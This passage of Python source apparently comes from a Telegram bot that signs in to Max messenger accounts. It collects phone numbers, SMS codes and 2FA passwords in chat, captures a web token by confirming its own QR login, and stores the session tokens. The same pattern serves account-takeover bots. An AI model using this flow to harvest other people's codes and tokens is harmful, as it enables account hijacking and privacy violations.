def retry_on_network_error(max_retries=3, delay=2):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(max_retries):
                try:
                    return await func(*args, **kwargs)
                except Exception as e:
                    last_exception = e
                    if attempt < max_retries - 1:
                        logging.warning(f"Сетевая ошибка, попытка {attempt + 1}/{max_retries}: {e}")
                        await asyncio.sleep(delay * (attempt + 1))
            raise last_exception
        return wrapper
    return decorator

async def get_web_token(phone, uid, work_dir):
    track_id = None
    web_device_id = gen_device_id()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "Content-Type": "application/json"
    }

    class TrackIdHandler(QrHandler):
        async def show_qr(self, qr_link):
            nonlocal track_id
            parts = qr_link.split('/')
            track_id = parts[-1] if parts else None
            logging.info(f"Получен track_id: {track_id}")
            return True

    try:
        web_client = WebClient(
            work_dir=f"{work_dir}_web_{int(time.time())}",
            auth_flow=QrAuthFlow(qr_provider=TrackIdHandler())
        )
        await web_client.start()
    except Exception as e:
        logging.error(f"WebClient error: {e}")

    if not track_id:
        return None, web_device_id

    logging.info(f"track_id: {track_id}")

    async with aiohttp.ClientSession() as session:
        resp = await session.post(
            "https://ws-api.oneme.ru/auth/confirm",
            json={"track_id": track_id, "device_id": web_device_id},
            headers=headers
        )
        logging.info(f"Confirm: {resp.status}")

        for i in range(30):
            resp = await session.get(
                f"https://ws-api.oneme.ru/auth/check_qr?track_id={track_id}",
                headers=headers
            )
            text = await resp.text()
            logging.info(f"Check QR {i}: {resp.status} {text[:200]}")

            if "login_available" in text.lower() or resp.status == 200:
                resp2 = await session.post(
                    "https://ws-api.oneme.ru/auth/confirm_qr",
                    json={"track_id": track_id},
                    headers=headers
                )
                text2 = await resp2.text()
                logging.info(f"Confirm QR: {resp2.status} {text2[:500]}")

                try:
                    data = json.loads(text2)
                    if data.get("token") or data.get("login_token"):
                        web_token = data.get("token") or data.get("login_token")
                        logging.info(f"Веб-токен: {web_token[:30]}...")
                        return web_token, web_device_id
                except:
                    pass
                break
            await asyncio.sleep(2)

    return None, web_device_id

@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\+7\d{10}$'))
async def phone_handler(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    uid = message.from_user.id
    work_dir = f"cache/{uid}/{phone}"
    os.makedirs(work_dir, exist_ok=True)

    db_path = os.path.join(work_dir, "session.db")
    if os.path.exists(db_path):
        os.remove(db_path)

    client = SocketMaxClient(phone=phone, work_dir=work_dir)
    pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir}

    await state.update_data(phone=phone, work_dir=work_dir)

    msg = await safe_send(message, "⏳ Отправляю SMS...")

    class FloodHandler(logging.Handler):
        def emit(self, record):
            msg_text = record.getMessage().lower()
            if "limit.violate" in msg_text or "слишком много попыток" in msg_text or "попробуйте позже" in msg_text:
                if uid in pending:
                    pending[uid]["status"] = "flood_sms"

    handler = FloodHandler()
    logging.getLogger().addHandler(handler)

    async def auth_task():
        try:
            await client.start()
            if uid in pending and pending[uid].get("status") != "flood_sms":
                pending[uid]["token"] = client.token
                pending[uid]["user_id"] = client.my_id
                pending[uid]["status"] = "done"
        except Exception as e:
            error = str(e).lower()
            if uid in pending:
                if "block" in error:
                    pending[uid]["status"] = "blocked"
                elif "password" in error or "2fa" in error:
                    pending[uid]["status"] = "need_password"
                elif "invalid" in error or "wrong" in error:
                    pending[uid]["status"] = "invalid_code"
                else:
                    pending[uid]["status"] = f"error:{e}"
        finally:
            logging.getLogger().removeHandler(handler)

    asyncio.ensure_future(auth_task())
    await asyncio.sleep(6)

    if uid not in pending:
        return

    status = pending[uid].get("status", "")

    if status == "flood_sms":
        await safe_edit(msg, "⏳ Слишком много попыток.")
        del pending[uid]
        await state.clear()
        return
    elif status == "blocked":
        await safe_edit(msg, "🚫 Заблокирован.")
        del pending[uid]
        await state.clear()
        return
    elif status and status.startswith("error:"):
        await safe_edit(msg, f"❌ {status[6:]}")
        del pending[uid]
        await state.clear()
        return

    await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")

@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
async def code_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    code = str(message.text.strip())

    if uid not in pending:
        return await safe_send(message, "⏳ Сессия устарела.")

    data = await state.get_data()
    phone = data["phone"]
    work_dir = data["work_dir"]

    import builtins
    builtins._code = code

    msg = await safe_send(message, "⏳ Проверяю код...")
    await asyncio.sleep(2)

    for _ in range(240):
        await asyncio.sleep(0.5)
        if uid not in pending:
            await safe_edit(msg, "⏳ Сессия устарела.")
            await state.clear()
            return
        status = pending[uid].get("status", "")

        if status == "done":
            token = pending[uid]["token"]
            viewer_id = pending[uid]["user_id"]

            uid_str = str(uid)
            if uid_str not in accounts:
                accounts[uid_str] = {}
            accounts[uid_str][phone] = {
                "token": token,
                "user_id": viewer_id,
                "work_dir": work_dir
            }
            save_accounts()

            await safe_edit(msg, "✅ Аккаунт добавлен!", reply_markup=accounts_keyboard(uid))
            del pending[uid]
            await state.clear()
            return

        elif status == "need_password":
            await state.set_state(AuthState.waiting_for_password)
            await safe_edit(msg, "🔐 Введи пароль 2FA:")
            return

        elif status == "invalid_code":
            await safe_edit(msg, "❌ Неверный код.")
            return

        elif status == "blocked":
            await safe_edit(msg, "🚫 Заблокирован.")
            del pending[uid]
            await state.clear()
            return

        elif status and status.startswith("error:"):
            await safe_edit(msg, f"❌ {status[6:]}")
            del pending[uid]
            await state.clear()
            return

    await safe_edit(msg, "❌ Таймаут.")
    del pending[uid]
    await state.clear()

@dp.message(AuthState.waiting_for_password)
async def password_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    pwd = message.text.strip()

    if uid not in pending:
        return await safe_send(message, "⏳ Сессия устарела.")

    data = await state.get_data()
    phone = data["phone"]
    work_dir = data["work_dir"]

    import builtins
    builtins._password = pwd
    pending[uid]["user_password"] = pwd

    msg = await safe_send(message, "⏳ Проверяю пароль...")
    await asyncio.sleep(4)

    db_path = os.path.join(work_dir, "session.db")
    if os.path.exists(db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions LIMIT 1")
            row = cursor.fetchone()
            if row:
                token = row[0]
                pending[uid]["token"] = token
                pending[uid]["status"] = "done"
            conn.close()
        except:
            pass

    if pending[uid].get("status") == "done":
        token = pending[uid]["token"]
        viewer_id = pending[uid].get("user_id") or 0

        uid_str = str(uid)
        if uid_str not in accounts:
            accounts[uid_str] = {}
        accounts[uid_str][phone] = {
            "token": token,
            "user_id": viewer_id,
            "work_dir": work_dir
        }
        save_accounts()

        await safe_edit(msg, "✅ Аккаунт добавлен!", reply_markup=accounts_keyboard(uid))
        del pending[uid]
        await state.clear()
        return

    await safe_edit(msg, "❌ Токен не найден.")
    del pending[uid]
    await state.clear()

async def main():
    import builtins
    import getpass

    original_input = builtins.input
    original_getpass = getpass.getpass

    def patched_input(prompt=""):
        prompt_lower = prompt.lower() if prompt else ""
        if "code" in prompt_lower or "код" in prompt_lower:
            import time as _time
            while not hasattr(builtins, '_code') or builtins._code is None:
                _time.sleep(0.5)
            code = builtins._code
            builtins._code = None
            return code
        elif "password" in prompt_lower or "пароль" in prompt_lower:
            import time as _time
            while not hasattr(builtins, '_password') or builtins._password is None:
                _time.sleep(0.5)
            pwd = builtins._password
            builtins._password = None
            return pwd
        return original_input(prompt)

    def patched_getpass(prompt=""):
        prompt_lower = prompt.lower() if prompt else ""
        if "password" in prompt_lower or "пароль" in prompt_lower or "2fa" in prompt_lower:
            for uid in list(pending.keys()):
                if pending[uid].get("status", "") not in ("done", "blocked", "flood_sms"):
                    pending[uid]["status"] = "need_password"
            import time as _time
            while not hasattr(builtins, '_password') or builtins._password is None:
                _time.sleep(0.5)
            pwd = builtins._password
            builtins._password = None
            return pwd
        return original_getpass(prompt)

    builtins.input = patched_input
    getpass.getpass = patched_getpass

    logging.info("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
